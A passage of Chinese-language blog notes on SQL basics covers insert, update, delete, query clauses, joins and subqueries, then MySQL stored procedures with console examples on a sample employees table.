<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(列名<span class="number">1</span>, 列名<span class="number">2</span>, ...) <span class="keyword">VALUES</span>(值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 全部列添加数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span>(值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br></pre></td></tr></table></figure>
<p><strong>—-c) 批量添加数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 以方式a批量添加</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名(列名<span class="number">1</span>, 列名<span class="number">2</span>, ...) <span class="keyword">VALUES</span>(值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...)...;</span><br><span class="line"># 以方式b批量添加</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span>(值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...), (值<span class="number">1</span>, 值<span class="number">2</span>, ...)...;</span><br></pre></td></tr></table></figure>

<h2 id="②修改数据"><a href="#②修改数据" class="headerlink" title="②修改数据"></a>②修改数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 列名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>, 列名<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>,...[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>
<h2 id="③删除数据"><a href="#③删除数据" class="headerlink" title="③删除数据"></a>③删除数据</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure>

<h1 id="三、DQL（Data-Query-Language）"><a href="#三、DQL（Data-Query-Language）" class="headerlink" title="三、DQL（Data Query Language）"></a>三、DQL（Data Query Language）</h1><p>查询表中数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    字段列表</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    表名列表</span><br><span class="line"><span class="keyword">WHERE</span> </span><br><span class="line">    条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    分组字段</span><br><span class="line"><span class="keyword">HAVING</span> </span><br><span class="line">    分组后条件</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> </span><br><span class="line">    排序字段</span><br><span class="line">LIMIT </span><br><span class="line">    分页限定;</span><br></pre></td></tr></table></figure>
<ul>
<li>基础查询</li>
<li>条件查询（WHERE） </li>
<li>分组查询（GRUOP BY）</li>
<li>排序查询（ORDER BY） </li>
<li>分页查询（LIMIT）</li>
</ul>
<h2 id="①基础查询"><a href="#①基础查询" class="headerlink" title="①基础查询"></a>①基础查询</h2><p><strong>—-a) 去除重复记录</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段列表 <span class="keyword">FROM</span> 表名; </span><br></pre></td></tr></table></figure>
<p><strong>—-b) 起别名</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 字段名与别名间可使用 <span class="keyword">as</span> 也可直接使用空格隔开</span><br><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span> <span class="keyword">as</span> 别名<span class="number">1</span>, 字段<span class="number">2</span> 别名<span class="number">2</span>, ... <span class="keyword">FROM</span> 表名; </span><br></pre></td></tr></table></figure>
<h2 id="②条件查询"><a href="#②条件查询" class="headerlink" title="②条件查询"></a>②条件查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件列表; </span><br></pre></td></tr></table></figure>
<p><strong>各条件符号功能如图所示</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163520.png" alt="各条件符号功能"></p>
<h2 id="③排序查询"><a href="#③排序查询" class="headerlink" title="③排序查询"></a>③排序查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 排序字段名<span class="number">1</span> [排序方式<span class="number">1</span>], 排序字段名<span class="number">2</span> [排序方式<span class="number">2</span>] ...; </span><br></pre></td></tr></table></figure>
<p><strong>排序方式：</strong></p>
<ul>
<li>ASC：升序排列（默认） </li>
<li>DESC：降序排列</li>
</ul>
<h2 id="④分组查询"><a href="#④分组查询" class="headerlink" title="④分组查询"></a>④分组查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 分组前条件限定] <span class="keyword">GROUP</span> <span class="keyword">BY</span> 分组字段名[<span class="keyword">HAVING</span> 分组后条件过滤];</span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;注意：分组之后，查询字段为聚合函数与分组字段，查询其他字段无意义&#x3D;&#x3D;<br><strong>where 与 having 区别：</strong></p>
<ul>
<li>执行时机不同：where 是分组之前进行限定，不满足 where 条件，则不参与分组，而 having 是分组之后对结果进行过滤。</li>
<li>可判断条件不一样：where 不能对聚合函数进行判断，having 可以。<br>&#x3D;&#x3D;执行顺序： where &gt; 聚合函数 &gt; having&#x3D;&#x3D;</li>
</ul>
<p> <strong>聚合函数</strong><br><strong>概念：将一列数据作为一个整体，进行纵向计算。</strong></p>
<ul>
<li><strong>聚合函数语法</strong> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 聚合函数(列名) <span class="keyword">FROM</span> 表名; </span><br></pre></td></tr></table></figure>
** &#x3D;&#x3D;null 值不参与所有聚合函数运算&#x3D;&#x3D;**<br><strong>各聚合函数功能如图所示</strong>****<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163520.png" alt="聚合函数功能表"></li>
</ul>
<h2 id="⑤分页查询"><a href="#⑤分页查询" class="headerlink" title="⑤分页查询"></a>⑤分页查询</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 LIMIT 起始索引, 查询条目数; </span><br></pre></td></tr></table></figure>
<p><strong>tips：</strong></p>
<ul>
<li>起始索引：从0开始 </li>
<li>计算公式：起始索引 &#x3D; （当前页码 - 1） * 每页显示条数</li>
<li>&#x3D;&#x3D;limit 是Mysql 数据库方言，oracle 分页查询使用 rownumber，SQL Server 分页查询使用 top。&#x3D;&#x3D;</li>
</ul>
<h1 id="四、多表查询"><a href="#四、多表查询" class="headerlink" title="四、多表查询"></a>四、多表查询</h1><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815163520.png"></p>
<ul>
<li>笛卡尔积：取A，B集合所有组合情况</li>
<li>多表查询：从多张表中查询数据</li>
</ul>
<h2 id="①连接查询"><a href="#①连接查询" class="headerlink" title="①连接查询"></a>①连接查询</h2><p>   <strong>—-a) 内连接：相当于从A，B交集数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 隐式内连接</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span>, 表<span class="number">2.</span>.. <span class="keyword">WHERE</span> 条件;</span><br><span class="line"></span><br><span class="line"># 显示内连接</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> [<span class="keyword">INNER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 条件;</span><br></pre></td></tr></table></figure>
<p><strong>—-b) 外连接：</strong><br>   ··············<strong>左外连接：相当于查询 A 表所有数据和交集部分数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">LEFT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 条件;</span><br></pre></td></tr></table></figure>

<p>   ··············<strong>右外连接：相当于查询 B 表所有数据和交集部分数据</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表<span class="number">1</span> <span class="keyword">RIGHT</span> [<span class="keyword">OUTER</span>] <span class="keyword">JOIN</span> 表<span class="number">2</span> <span class="keyword">ON</span> 条件;</span><br></pre></td></tr></table></figure>

<h2 id="②子查询"><a href="#②子查询" class="headerlink" title="②子查询"></a>②子查询</h2><p> <strong>—-a) 单行单列：作为条件值，使用&#x3D;、!&#x3D;、&gt;、&lt;等进行条件判断</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 字段名 <span class="operator">=</span> (子查询);</span><br></pre></td></tr></table></figure>

<p> <strong>—-b) 多行单列：作为条件值，使用 in 关键字进行条件判断</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表 <span class="keyword">WHERE</span> 字段名 <span class="keyword">IN</span> (子查询);</span><br></pre></td></tr></table></figure>

<p> <strong>—-c) 多行多列：作为虚拟表</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> (子查询) <span class="keyword">WHERE</span> 条件;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-存储过程与函数</title>
    <url>/posts/442d16e2.html</url>
    <content><![CDATA[<blockquote>
<p>MySQL从5.0版本开始支持存储过程和函数。存储过程和函数能够将复杂的SQL逻辑封装在一起，应用程<br>序无须关注存储过程和函数内部复杂的SQL逻辑，而只需要简单地调用存储过程和函数即可。</p>
</blockquote>
<h1 id="一、存储过程概述"><a href="#一、存储过程概述" class="headerlink" title="一、存储过程概述"></a>一、存储过程概述</h1><h2 id="1-如何理解存储过程"><a href="#1-如何理解存储过程" class="headerlink" title="1. 如何理解存储过程"></a>1. 如何理解存储过程</h2><ul>
<li><strong>含义</strong>：<br>存储过程的英文是 Stored Procedure 。它的思想很简单，就是一组经过 预先编译 的 SQL 的封装。<br>执行过程：存储过程预先存储在 MySQL 服务器上，需要执行的时候，客户端只需要向服务器端发出调用存储过程的命令，服务器端就可以把预先存储好的这一系列 SQL 语句全部执行。</li>
<li><strong>好处</strong>：<ul>
<li>简化操作，提高了sql语句的重用性，减少了开发程序员的压力 </li>
<li>减少操作过程中的失误，提高效率</li>
<li>减少网络传输量（客户端不需要把所有的 SQL 语句通过网络发给服务器） </li>
<li>减少了 SQL 语句暴露在网上的风险，也提高了数据查询的安全性</li>
</ul>
</li>
<li><strong>和视图、函数的对比</strong>：<br>它和视图有着同样的优点，清晰、安全，还可以减少网络传输量。不过它和视图不同，视图是 <strong>虚拟表</strong> ，通常不对底层数据表直接操作，而存储过程是程序化的 SQL，可以 <strong>直接操作底层数据表</strong> ，相比于面向集合的操作方式，能够实现一些更复杂的数据处理。<br>一旦存储过程被创建出来，使用它就像使用函数一样简单，我们直接通过调用存储过程名即可。相较于函数，存储过程是 <strong>没有返回值</strong> 的。</li>
</ul>
<h2 id="2-存储过程分类"><a href="#2-存储过程分类" class="headerlink" title="2. 存储过程分类"></a>2. 存储过程分类</h2><p>存储过程的参数类型可以是IN、OUT和INOUT。根据这点分类如下</p>
<ul>
<li>没有参数（<strong>无参数无返回</strong>） </li>
<li>仅仅带 <code>IN</code> 类型（<strong>有参数无返回</strong>）</li>
<li>仅仅带 <code>OUT</code> 类型（<strong>无参数有返回</strong>） </li>
<li>既带 <code>IN</code> 又带 <code>OUT</code>（<strong>有参数有返回</strong>） </li>
<li>带 <code>INOUT</code>（<strong>有参数有返回</strong>）</li>
</ul>
<p><strong>注意</strong>：<code>IN</code>、<code>OUT</code>、<code>INOUT</code> 都可以在一个存储过程中带多个。</p>
<hr>
<h1 id="二、创建存储过程"><a href="#二、创建存储过程" class="headerlink" title="二、创建存储过程"></a>二、创建存储过程</h1><h2 id="1-语法分析"><a href="#1-语法分析" class="headerlink" title="1. 语法分析"></a>1. 语法分析</h2><ul>
<li>语法格式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> 存储过程名(<span class="keyword">IN</span><span class="operator">|</span><span class="keyword">OUT</span><span class="operator">|</span><span class="keyword">INOUT</span> 参数名 参数类型,...)</span><br><span class="line">[characteristics ...]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	存储过程体</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<ul>
<li>类似于Java中的方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回类型 方法名(参数类型 参数名,...)&#123;</span><br><span class="line">	方法体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>说明：</strong></p>
<ol>
<li>参数前面的符号的意思</li>
</ol>
<ul>
<li><code>IN</code> ：当前参数为输入参数，也就是表示入参；存储过程只是读取这个参数的值。如果没有定义参数种类， <strong>默认就是 <code>IN</code></strong> ，表示输入参数。</li>
<li><code>OUT</code> ：当前参数为输出参数，也就是表示出参；执行完成之后，调用这个存储过程的客户端或者应用程序就可以读取这个参数返回的值了。</li>
<li><code>INOUT</code> ：当前参数既可以为输入参数，也可以为输出参数。</li>
</ul>
<ol start="2">
<li>形参类型可以是 MySQL数据库中的任意类型。</li>
<li><code>characteristics</code> 表示创建存储过程时指定的对存储过程的约束条件，其取值信息如下：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LANGUAGE</span> <span class="keyword">SQL</span></span><br><span class="line"><span class="operator">|</span> [<span class="keyword">NOT</span>] <span class="keyword">DETERMINISTIC</span></span><br><span class="line"><span class="operator">|</span> &#123; <span class="keyword">CONTAINS</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">NO</span> <span class="keyword">SQL</span> <span class="operator">|</span> <span class="keyword">READS</span> <span class="keyword">SQL</span> DATA <span class="operator">|</span> <span class="keyword">MODIFIES</span> <span class="keyword">SQL</span> DATA &#125;</span><br><span class="line"><span class="operator">|</span> <span class="keyword">SQL</span> SECURITY &#123; DEFINER <span class="operator">|</span> INVOKER &#125;</span><br><span class="line"><span class="operator">|</span> COMMENT <span class="string">&#x27;string&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>LANGUAGE SQL</code> ：说明存储过程执行体是由SQL语句组成的，当前系统支持的语言为SQL。</li>
<li><code>[NOT] DETERMINISTIC</code> ：指明存储过程执行的结果是否确定。<code>DETERMINISTIC</code>表示结果是确定的。每次执行存储过程时，相同的输入会得到相同的输出。<code>NOT DETERMINISTIC</code>表示结果是不确定的，相同的输入可能得到不同的输出。如果没有指定任意一个值，**默认为<code>NOT DETERMINISTIC</code>**。</li>
<li><code>&#123; CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA &#125;</code> ：<br>指明子程序使用SQL语句的限制。<ul>
<li><code>CONTAINS SQL</code>表示当前存储过程的子程序包含SQL语句，但是并不包含读写数据的SQL语句；</li>
<li><code>NO SQL</code>表示当前存储过程的子程序中不包含任何SQL语句；</li>
<li><code>READS SQL DATA</code>表示当前存储过程的子程序中包含读数据的SQL语句；</li>
<li><code>MODIFIES SQL DATA</code>表示当前存储过程的子程序中包含写数据的SQL语句。</li>
<li><strong>默认情况下</strong>，系统会指定为<code>CONTAINS SQL</code>。</li>
</ul>
</li>
<li><code>SQL SECURITY &#123; DEFINER | INVOKER &#125;</code> ：执行当前存储过程的权限，即指明哪些用户能够执<br>行当前存储过程。<ul>
<li><code>DEFINER</code> 表示只有当前存储过程的创建者或者定义者才能执行当前存储过程；</li>
<li><code>INVOKER</code> 表示拥有当前存储过程的访问权限的用户能够执行当前存储过程。</li>
<li>如果没有设置相关的值，则MySQL**默认指定值为<code>DEFINER</code>**。</li>
</ul>
</li>
<li><code>COMMENT &#39;string&#39;</code> ：注释信息，可以用来描述存储过程。</li>
</ul>
<ol start="4">
<li>存储过程体中可以有多条 SQL 语句，如果仅仅一条SQL 语句，则可以省略 <code>BEGIN</code> 和 <code>END</code></li>
</ol>
<p>编写存储过程并不是一件简单的事情，可能存储过程中需要复杂的 SQL语句。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">BEGIN</span>…<span class="keyword">END</span>：<span class="keyword">BEGIN</span>…<span class="keyword">END</span> 中间包含了多个语句，每个语句都以（;）号为结束符。</span><br><span class="line"><span class="number">2.</span> <span class="keyword">DECLARE</span>：<span class="keyword">DECLARE</span> 用来声明变量，使用的位置在于 <span class="keyword">BEGIN</span>…<span class="keyword">END</span> 语句中间，而且需要在其他语句使用之前进</span><br><span class="line">行变量的声明。</span><br><span class="line"><span class="number">3.</span> <span class="keyword">SET</span>：赋值语句，用于对变量进行赋值。</span><br><span class="line"><span class="number">4.</span> <span class="keyword">SELECT</span>… <span class="keyword">INTO</span>：把从数据表中查询的结果存放到变量中，也就是为变量赋值。</span><br></pre></td></tr></table></figure>


<ol start="5">
<li>需要设置新的结束标记</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER 新的结束标记</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p>因为MySQL默认的语句结束符号为分号<code>;</code>。</p>
</li>
<li><p>为了避免与存储过程中SQL语句结束符相冲突，需要使用 <code>DELIMITER</code>改变存储过程的结束符。 比如：<code>DELIMITER //</code>语句的作用是将MySQL的结束符设置为<code>//</code>，并以<code>END //</code>结束存储过程。存储过程定义完毕之后再使用<code>DELIMITER ;</code>恢复默认结束符。</p>
</li>
<li><p><code>DELIMITER</code>也可以指定其他符号作为结束符。当使用DELIMITER命令时，<strong>应该避免使用反斜杠<code>\</code>字符</strong>，因为反斜线是MySQL的转义字符。</p>
</li>
</ul>
</blockquote>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">DELIMITER $</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> 存储过程名(<span class="keyword">IN</span><span class="operator">|</span><span class="keyword">OUT</span><span class="operator">|</span><span class="keyword">INOUT</span> 参数名 参数类型,...)</span><br><span class="line">[characteristics ...]</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	<span class="keyword">sql</span>语句<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">sql</span>语句<span class="number">2</span>;</span><br><span class="line"><span class="keyword">END</span> $</span><br></pre></td></tr></table></figure>




<h2 id="2-创建存储过程示例"><a href="#2-创建存储过程示例" class="headerlink" title="2. 创建存储过程示例"></a>2. 创建存储过程示例</h2><ul>
<li><p><strong>类型1：无参数无返回值</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">1</span>：创建存储过程select_all_data()，查看 employees 表的所有数据</span><br><span class="line">mysql<span class="operator">&gt;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER $</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> select_all_data()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> $</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 存储过程的调用 （以下有<span class="number">107</span>行数据，被我删减了只剩<span class="number">3</span>行）</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> select_all_data();</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+-------------+----------+--------------------+------------+------------+----------+----------------+------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> employee_id <span class="operator">|</span> first_name  <span class="operator">|</span> last_name   <span class="operator">|</span> email    <span class="operator">|</span> phone_number       <span class="operator">|</span> hire_date  <span class="operator">|</span> job_id     <span class="operator">|</span> salary   <span class="operator">|</span> commission_pct <span class="operator">|</span> manager_id <span class="operator">|</span> department_id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+-------------+----------+--------------------+------------+------------+----------+----------------+------------+---------------+</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">100</span> <span class="operator">|</span> Steven      <span class="operator">|</span> King        <span class="operator">|</span> SKING    <span class="operator">|</span> <span class="number">515.123</span><span class="number">.4567</span>       <span class="operator">|</span> <span class="number">1987</span><span class="number">-06</span><span class="number">-17</span> <span class="operator">|</span> AD_PRES    <span class="operator">|</span> <span class="number">24000.00</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span>            <span class="number">90</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">205</span> <span class="operator">|</span> Shelley     <span class="operator">|</span> Higgins     <span class="operator">|</span> SHIGGINS <span class="operator">|</span> <span class="number">515.123</span><span class="number">.8080</span>       <span class="operator">|</span> <span class="number">1994</span><span class="number">-06</span><span class="number">-07</span> <span class="operator">|</span> AC_MGR     <span class="operator">|</span> <span class="number">12000.00</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span>        <span class="number">101</span> <span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">206</span> <span class="operator">|</span> William     <span class="operator">|</span> Gietz       <span class="operator">|</span> WGIETZ   <span class="operator">|</span> <span class="number">515.123</span><span class="number">.8181</span>       <span class="operator">|</span> <span class="number">1994</span><span class="number">-06</span><span class="number">-07</span> <span class="operator">|</span> AC_ACCOUNT <span class="operator">|</span>  <span class="number">8300.00</span> <span class="operator">|</span>           <span class="keyword">NULL</span> <span class="operator">|</span>        <span class="number">205</span> <span class="operator">|</span>           <span class="number">110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+-------------+-------------+----------+--------------------+------------+------------+----------+----------------+------------+---------------+</span></span><br><span class="line"><span class="number">107</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 举例<span class="number">2</span>：创建存储过程avg_employee_salary()，返回所有员工的平均工资</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> avg_employee_salary()</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">SELECT</span> <span class="built_in">AVG</span>(salary) <span class="keyword">FROM</span> employees;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 存储过程的调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> avg_employee_salary();</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">AVG</span>(salary) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">6461.682243</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.54</span> sec)</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">1.54</span> sec)</span><br></pre></td></tr></table></figure>


</li>
<li><p><strong>类型2：带 <code>OUT</code></strong></p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例：创建存储过程show_min_salary()，查看“emps”表的最低薪资值。并将最低薪资通过<span class="keyword">OUT</span>参数“ms</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> show_min_salary(<span class="keyword">OUT</span> ms <span class="keyword">DOUBLE</span>)</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">SELECT</span> <span class="built_in">MIN</span>(salary) <span class="keyword">INTO</span> ms</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">FROM</span> employees;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER ;</span><br><span class="line">mysql<span class="operator">&gt;</span> # 存储过程的调用</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> show_min_salary(<span class="variable">@ms</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> # 查看变量值</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="variable">@ms</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@ms</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2100</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.95</span> sec)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>类型3：带 <code>IN</code></strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> # 举例：创建存储过程show_someone_salary()，查看“emps”表的某个员工的薪资，并用<span class="keyword">IN</span>参数empname输入员工姓名。</span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> show_someone_salary(<span class="keyword">IN</span> empname <span class="type">VARCHAR</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">BEGIN</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">SELECT</span> salary <span class="keyword">FROM</span> employees</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>  	<span class="keyword">WHERE</span> last_name <span class="operator">=</span> empname;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> DELIMITER</span><br><span class="line">mysql<span class="operator">&gt;</span> # 调用方式<span class="number">1</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CALL</span> show_someone_salary(<span class="string">&#x27;Abel&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+</span></span><br><span class="line"><span class="operator">|</span> salary   <span class="operator">|</span></span><br><span 